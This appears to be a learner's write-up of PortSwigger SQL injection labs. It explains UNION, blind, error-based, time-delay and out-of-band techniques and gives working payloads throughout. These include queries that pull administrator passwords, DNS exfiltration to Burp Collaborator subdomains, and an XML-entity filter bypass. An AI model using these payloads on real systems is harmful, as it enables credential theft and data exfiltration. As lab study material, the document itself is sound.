# 🕌 SQL injection

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

#### SQL injection UNION attacks

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query

#### Determining the number of columns required

injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:

`' ORDER BY 1--`&#x20;

`' ORDER BY 2--`&#x20;

`' ORDER BY 3--`&#x20;

`etc.`

The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:

`' UNION SELECT NULL--`&#x20;

`' UNION SELECT NULL,NULL--`&#x20;

`' UNION SELECT NULL,NULL,NULL--`&#x20;

`etc.`

If the number of nulls does not match the number of columns, the database returns an error

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

so for this one i just did some recon and looked for the number of columns with the union select parameter, adding NULL variables until it doesn't error out:

<figure><img src="../../.gitbook/assets/image (832).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (833).png" alt=""><figcaption></figcaption></figure>

#### Database-specific syntax

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose.

```
' UNION SELECT NULL FROM DUAL--
```

other DB specific syntax:[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

`' UNION SELECT 'a',NULL,NULL,NULL--`&#x20;

`' UNION SELECT NULL,'a',NULL,NULL--`&#x20;

`' UNION SELECT NULL,NULL,'a',NULL--`&#x20;

`' UNION SELECT NULL,NULL,NULL,'a'--`

If the column data type is not compatible with string data, the injected query will cause a database error,

### Lab: SQL injection UNION attack, finding a column containing text

for this one i first determined the number of columns, it took me 3 NULL's to bypass the error, i then inputted the requested string in the different columns to finally solve the lab:

<figure><img src="../../.gitbook/assets/image (834).png" alt=""><figcaption></figcaption></figure>

#### Using a SQL injection UNION attack to retrieve interesting data

### Lab: SQL injection UNION attack, retrieving data from other tables

<figure><img src="../../.gitbook/assets/image (835).png" alt=""><figcaption></figcaption></figure>

So we are given all the informations needed to construct our sqli,&#x20;

<figure><img src="../../.gitbook/assets/image (836).png" alt=""><figcaption></figcaption></figure>

and on the webpage we got:

<figure><img src="../../.gitbook/assets/image (837).png" alt=""><figcaption></figcaption></figure>

and you just need to connect with those creds to solve lab

#### Retrieving multiple values within a single column

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together with a separator. On oracle, the syntax would be:

```
' UNION SELECT username || '~' || password FROM users--
```

### Lab: SQL injection UNION attack, retrieving multiple values in a single column

i start by figuring out how many columns:

<figure><img src="../../.gitbook/assets/image (838).png" alt=""><figcaption></figcaption></figure>

then which one is the good column:

<figure><img src="../../.gitbook/assets/image (839).png" alt=""><figcaption></figcaption></figure>

and final payload ->

<figure><img src="../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

#### Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

<figure><img src="../../.gitbook/assets/image (813).png" alt=""><figcaption></figcaption></figure>

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

We start by looking for the number of columns:

<figure><img src="../../.gitbook/assets/image (815).png" alt=""><figcaption></figcaption></figure>

and try to print the version

<figure><img src="../../.gitbook/assets/image (816).png" alt=""><figcaption></figcaption></figure>

#### Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

### Lab: SQL injection attack, listing the database contents on non-Oracle databases

We start by looking at the interesting tables

```
GET /filter?category=Lifestyle' UNION SELECT table_name, null FROM information_schema.tables--
```

<figure><img src="../../.gitbook/assets/image (819).png" alt=""><figcaption></figcaption></figure>

then check the columns in that table to print out the interesting values

```
GET /filter?category=Lifestyle' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users_znlzdn'--
```

<figure><img src="../../.gitbook/assets/image (817).png" alt=""><figcaption></figcaption></figure>

```
GET /filter?category=Lifestyle' UNION SELECT username_fjtbql, password_mjqvpb FROM users_znlzdn--
```

<figure><img src="../../.gitbook/assets/image (818).png" alt=""><figcaption></figcaption></figure>

#### Blind SQL injection

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses.

### Lab: Blind SQL injection with conditional responses

When we don't input well the sqli, the "Welcome back" message does not pop:

<figure><img src="../../.gitbook/assets/image (820).png" alt=""><figcaption></figcaption></figure>

but when we input it well ->

<figure><img src="../../.gitbook/assets/image (821).png" alt=""><figcaption></figcaption></figure>

To verify there is a table called users ->

```
TrackingId=fNg3RnqiOBbPgwwI'AND (SELECT 'a' FROM users LIMIT 1)='a
```

* `AND`: This is a logical operator used to combine conditions in SQL queries.
* `(SELECT 'a' FROM users LIMIT 1)='a'`: This part is a subquery. It's attempting to select the character `'a'` from the `users` table with a limit of 1 row. Then, it compares this selected value with the character `'a'`.

Now i want to check if there is a administrator user like the exercice says:

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
TrackingId=fNg3RnqiOBbPgwwI'AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

Now we need to determine the length of the password ->

```
TrackingId=fNg3RnqiOBbPgwwI'AND (SELECT 'b' FROM users WHERE username='administrator' AND LENGTH (password)>19)='b
```

This returns us Welcome back assuming that it is true but when we put in 20 we don't have it anymore. Just to be sure, we can change to = ->

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Error-based SQL injection

It's when you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts.

* Return a specific error response based on the result of a boolean expression.
* Trigger error messages that output the data returned by the query



### Lab: Blind SQL injection with conditional responses

We're able to make an error with a single quote on the tracking ID:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can test out the bounderies of this injection with TRUE & FALSE conditions:

```
' AND '1'='1
' AND '1'='2
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>True statement</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>False statement</p></figcaption></figure>

Since we have the name of the tables and columns to exploit, we can make the correct query:

```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm
```

1. **SELECT password FROM users WHERE username = 'administrator'**: This is a SQL query selecting the password from a table called 'users' where the username is 'administrator'. It's attempting to retrieve the password associated with the administrator account.
2. **SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1)**: This part of the expression is attempting to extract a substring from the password selected in the previous step. It's grabbing the first character of the password.
3. **> 'm'**: This is a conditional statement comparing the first character of the password to the letter 'm'. If the ASCII value of the first character of the password is greater than the ASCII value of 'm', the condition will be true.



#### Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages, ex:

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

We can see that in this case, we're injecting into a single-quoted string inside a `WHERE` statement. This makes it easier to construct a valid query containing a malicious payload.

You can use the `CAST()` function to convert one data type to another. For example, imagine a query containing the following statement:

```
CAST((SELECT example_column FROM example_table) AS int)
```

### Lab: Visible error-based SQL injection

we are able to trigger an error with a single quote on the tracking id:

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If we use the CAST command, we get a different error:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If we input this query, we do not have any errors anymore&#x20;

```
' AND 1=CAST((SELECT 1 ) AS int)--
```

`AND 1=CAST((SELECT 1 ) AS int)`: This is the injected SQL code. It attempts to manipulate the SQL query's logic to always evaluate to true. It checks if 1 is equal to the result of casting the value 1 as an integer. This condition will always be true.

But if we try to adapt and put:

<figure><img src="../../.gitbook/assets/2024-04-19_11-12.png" alt=""><figcaption></figcaption></figure>

we see the query is cut to a certain point, so we need to free some space by reducing the initial tracking ID

```
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

<figure><img src="../../.gitbook/assets/2024-04-19_11-19.png" alt=""><figcaption></figcaption></figure>

The error is different, so now we can try printing out the password:

<figure><img src="../../.gitbook/assets/2024-04-19_11-29.png" alt=""><figcaption></figcaption></figure>

and just like that we are able to connect to the admin account

final payload:

```
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

#### Exploiting blind SQL injection by triggering time delays

It is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

* The first of these inputs does not trigger a delay, because the condition `1=2` is false.
* The second input triggers a delay of 10 seconds, because the condition `1=1` is true.

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

### Lab: Blind SQL injection with time delays and information retrieval

We need to be aware of the different versions for the time delays:

<figure><img src="../../.gitbook/assets/image (844).png" alt=""><figcaption></figcaption></figure>

This query worked for the injection:

```
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- 
#OR
';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Then query to check if user administrator exists&#x20;

```
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-
#OR
';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Now we need to check how long is the password:

```
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
#OR
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

So now the query should look something like this:

```
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
#OR
'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTRING(password,1,1)%3d'a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

I put the cluster bomb, launch the attack and filter out the requests:

<figure><img src="../../.gitbook/assets/image (842).png" alt=""><figcaption></figcaption></figure>

i put a time sleep of 4 seconds so anything in that range and above is probably correct

and for better filter:

<figure><img src="../../.gitbook/assets/image (843).png" alt=""><figcaption></figcaption></figure>

put all the letters in order and solve the challenge

#### Exploiting blind SQL injection using out-of-band (OAST) techniques

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.

A tool for using out-of-band techniques is Burp Collaborator.

It is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box.

the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

This causes the database to perform a lookup for the following domain:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```



**payload:**

```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

1. **UNION SELECT**: This part of the injection indicates that the attacker is attempting to append their own SQL query to the original query. The `UNION` operator is used to combine the result sets of two separate SELECT queries into a single result set.
2. **EXTRACTVALUE(xmltype('\<?xml version="1.0" encoding="UTF-8"?>\<!DOCTYPE root \[ \<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l')**: Here, the attacker is using the `EXTRACTVALUE` function in Oracle SQL to extract a value from an XML document. The XML document is crafted by the attacker and contains a reference to an external entity declared in the DTD (Document Type Definition) section.
   * The XML document starts with a standard XML declaration (`<?xml version="1.0" encoding="UTF-8"?>`).
   * Then, a DTD is defined within the XML document using `<!DOCTYPE root [ ... ]>` syntax. Within the DTD, an external entity `%remote` is declared, which points to a URL specified by the attacker (`http://BURP-COLLABORATOR-SUBDOMAIN/`).
   * The `%remote;` entity is then referenced within the XML document.
   * The `EXTRACTVALUE` function is then used to extract a value from this crafted XML document. The XPath expression `/l` is specified, attempting to extract the value of the `<l>` element from the XML document.
3. **FROM dual**: In Oracle SQL, `dual` is a special one-row, one-column table. It is commonly used in SQL queries where you don't need to query any particular table, but you still need to execute some SQL logic.
4. **--**: This is a comment in SQL. Everything after `--` is ignored by the SQL engine.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And if you triggered everything properly it solves the lab by interracting with Collaborator

Now we would need to use the out-of-band channel to exfiltrate data from the vulnerable application

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

* **declare @p varchar(1024)**: This line declares a variable `@p` of type `varchar` with a maximum length of 1024 characters.
* **set @p=(SELECT password FROM users WHERE username='Administrator')**: This SQL statement selects the password associated with the username 'Administrator' from the 'users' table and assigns it to the variable `@p`.
* **exec('master..xp\_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')**: This part executes a dynamic SQL statement using the `exec` function. It constructs a command to execute the extended stored procedure `xp_dirtree` from the `master` database. The procedure is being used to traverse directories on the server. The directory path is constructed dynamically using the value of the `@p` variable concatenated with a fixed string and a Burp Collaborator URL.
* **--**: This is a comment in SQL, indicating that everything after `--` is ignored by the SQL engine.

### Lab: Blind SQL injection with out-of-band data exfiltration

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### SQL injection in different contexts

In the previous labs, you used the query string to inject your malicious SQL payload. However, you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.

you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`:

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

### Lab: SQL injection with filter bypass via XML encoding

We start by looking at the "check stock" request:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We check the unicode character of U to perform sqli:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
&#x55;
```

If we try to inject without ecoding it detects the attack

So we will need to bypass the WAF

1. As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select **Extensions > Hackvertor > Encode > dec\_entities/hex\_entities**.
2. Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.

Another way of encoding everything is to hop on cyberchef

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and then we get this response to our payload:

<figure><img src="../../.gitbook/assets/Capture d’écran du 2024-04-21 11-58-04.png" alt=""><figcaption></figcaption></figure>

#### Second-order SQL injection

First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.

Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
